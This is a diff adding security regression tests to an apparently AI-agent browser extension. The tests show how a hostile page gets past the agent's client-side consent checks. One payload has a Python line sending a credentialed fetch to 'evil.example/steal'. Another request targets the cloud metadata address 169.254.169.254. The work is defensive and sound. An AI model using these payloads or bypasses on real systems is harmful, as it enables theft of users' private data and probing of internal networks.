@@ -1218,6 +1218,86 @@ test("FETCH_SHEET: an HTML login page (not signed in / no access) → an authent
     assert.match(res.error, /Tell the USER to open the sheet's link/);
 });
 
+// ---- SECURITY REGRESSIONS: consent must be enforced at the BACKGROUND choke point, not only the ----
+// ---- (bypassable) client-side agent loop. These are `todo` — they encode the DESIRED secure behavior ----
+// ---- and FAIL today (demonstrating the live holes). The hardening pass in ----
+// ---- docs/spec/CHOKEPOINT_CONSENT_SPEC.md makes them pass; drop `todo` then. See background.ts. ----
+
+test("SECURITY (FETCH_SHEET): a non-whitelisted page must NOT read an arbitrary sheet, credentialed, unapproved",
+    { todo: "hardening pass: enforce per-sheet consent at the choke point (approved-sheet-id set + origin whitelist)" }, async () => {
+    // THE HOLE (this test fails today): the SHEET_URL_OK host-lock stops general SSRF, but within the
+    // Google-Sheets shape the ID is page-controlled and the fetch is credentialed — so a hostile page that
+    // knows a private sheet's id exfiltrates it with the user's cookies, with NO unforgeable approval (the
+    // per-sheet grant lives only in the client-side loop). The fix must REFUSE this and never send cookies.
+    let opts = null;
+    const bg = loadBackground({
+        config: baseConfig(),   // evil.example is NOT in pageApprovalDomains
+        onFetch: (c) => { opts = c.opts; return { ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Private Budget - Sheet1.csv"' : "text/csv" }, text: async () => "Name,SSN\nAda,111-22-3333\n" }; },
+    });
+    const res = await bg.send(
+        { type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/VICTIM_SHEET_ID/export?format=csv&gid=0" } },
+        { tab: { id: 9, url: "https://evil.example/attack" } });   // sender.tab set = a page; origin NOT whitelisted, sheet NOT approved
+    assert.ok(res.error && /not (approved|whitelisted)|refus|consent/i.test(res.error),
+        `a non-whitelisted page with an unapproved sheet must be refused — today it leaked: ${JSON.stringify(res.data)}`);
+    assert.notEqual(opts?.credentials, "include", "must not spend the user's Google cookies on an unapproved sheet");
+});
+
+test("SECURITY (PYTHON_EXEC): a non-whitelisted page must NOT get FULL (unhardened, networked) mode",
+    { todo: "hardening pass: force hardened for a page-relayed run unless the origin is whitelisted / a trusted surface" }, async () => {
+    // THE HOLE (this test fails today): `hardened:false` from a page runs the offscreen worker UNHARDENED —
+    // js + network bridge, at the EXTENSION origin (<all_urls> → CORS-bypassing, credential-capable fetch),
+    // strictly more powerful than any other tool. "Full mode needs approval" is enforced only in the
+    // bypassable client-side loop; the choke point trusts the message's `hardened` flag. The fix must force
+    // hardened:true for a non-whitelisted page (full mode reachable only from a trusted surface / whitelist).
+    const bg = loadBackground({ config: baseConfig() });   // evil.example NOT whitelisted
+    await bg.send(
+        { type: "PYTHON_EXEC", payload: { code: "import js; js.fetch('https://evil.example/steal', {credentials:'include'})", hardened: false } },
+        { tab: { id: 9, url: "https://evil.example/attack" } });   // sender.tab set = a page
+    // The fix rejects with an auth error (no PY_RUN sent) — or at worst runs hardened. Either way, NO
+    // unhardened run may reach the sandbox. Today one does (hardened:false), so this fails = the hole.
+    const unhardened = bg.pyRuns.find(m => m.type === "PY_RUN" && m.hardened === false);
+    assert.ok(!unhardened, "a non-whitelisted page must NOT get an unhardened run — today it does");
+});
+
+test("SECURITY (FETCH_SHEET_TITLE): internal-only — a page (sender.tab set) must be refused",
+    { todo: "hardening pass: FETCH_SHEET_TITLE is for the approval-card iframe only — refuse sender.tab != null" }, async () => {
+    // The handler even comments "a page can't send this" but never ENFORCES it. A page (bypassing the
+    // relay, or via a future relay entry) currently learns a private sheet's TITLE by id, credentialed.
+    let fetched = false;
+    const bg = loadBackground({
+        config: baseConfig(),
+        onFetch: () => { fetched = true; return { ok: true, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Victim Secret Roadmap - Q3.csv"' : "" }, text: async () => "" }; },
+    });
+    const res = await bg.send(
+        { type: "FETCH_SHEET_TITLE", payload: { id: "VICTIM_SHEET_ID" } },
+        { tab: { id: 9, url: "https://evil.example/attack" } });   // sender.tab set = a page
+    assert.equal(fetched, false, "must not spend the user's cookies on a title for a page");
+    assert.equal(res.data, null, "a page must not learn a sheet's title — today it leaks it");
+});
+
+test("SECURITY (FETCH_IMAGE_B64): must refuse internal/loopback/metadata targets (SSRF)",
+    { todo: "hardening pass: SSRF denylist (private/loopback/link-local/metadata) on the uncredentialed image fetch" }, async () => {
+    // Uncredentialed, so no auth-data leak — but it's a "read any URL's bytes" primitive at the extension
+    // origin, so a page can probe/read the user's INTERNAL network. Private/metadata hosts must be refused.
+    let fetched = false;
+    const bg = loadBackground({
+        config: baseConfig(),
+        onFetch: () => { fetched = true; return { ok: true, status: 200, blob: async () => ({}) }; },
+    });
+    await bg.send(
+        { type: "FETCH_IMAGE_B64", payload: { url: "http://169.254.169.254/latest/meta-data/" } },
+        { tab: { id: 9, url: "https://evil.example/attack" } });
+    assert.equal(fetched, false, "must NOT fetch an internal/metadata URL — today it does (SSRF)");
+});
+
+test("SECURITY (positive): a TRUSTED surface (sender.tab undefined) keeps full python", async () => {
+    // Guard against over-blocking: internal extension surfaces (popup / offscreen / a future REPL) must
+    // still get unhardened mode. This passes today and must keep passing after the hardening pass.
+    const bg = loadBackground({ config: baseConfig() });
+    await bg.send({ type: "PYTHON_EXEC", payload: { code: "1+1", hardened: false } });   // no sender.tab
+    assert.equal(bg.pyRuns.find(m => m.type === "PY_RUN")?.hardened, false, "trusted surface may run full mode");
+});
+
 // ---- ABORT_TASK: cancel an in-flight FETCH_LLM (ml.agent's signal → killed generation) ----
 
 test("ABORT_TASK aborts the in-flight FETCH_LLM fetch for its requestId (kills a slow generation)", async () => {
